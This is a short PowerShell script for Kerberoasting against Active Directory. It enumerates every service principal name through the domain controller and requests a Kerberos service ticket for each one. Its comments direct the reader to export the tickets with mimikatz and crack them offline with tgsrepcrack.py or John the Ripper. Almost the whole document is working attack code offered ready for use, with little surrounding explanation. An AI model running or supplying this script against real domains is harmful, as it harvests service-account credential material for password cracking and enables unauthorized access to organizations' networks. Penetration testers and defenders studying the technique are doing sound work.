#This script will query the Domain Controller and request a service ticket for every available Service Principle Name.
#They will be loaded into memory for extraction with mimikatz or similar. mimikatz # kerberos::list /export 
#The service tickets can then be used in a password brute force attack, with tgsrepcrack.py, or John The Ripper etc.

Add-Type -AssemblyName System.IdentityModel

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="serviceprincipalname=*"

$Result =$Searcher.FindAll()
 
Foreach($prop in $Result.Properties.serviceprincipalname)
{ 
  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ($prop)
}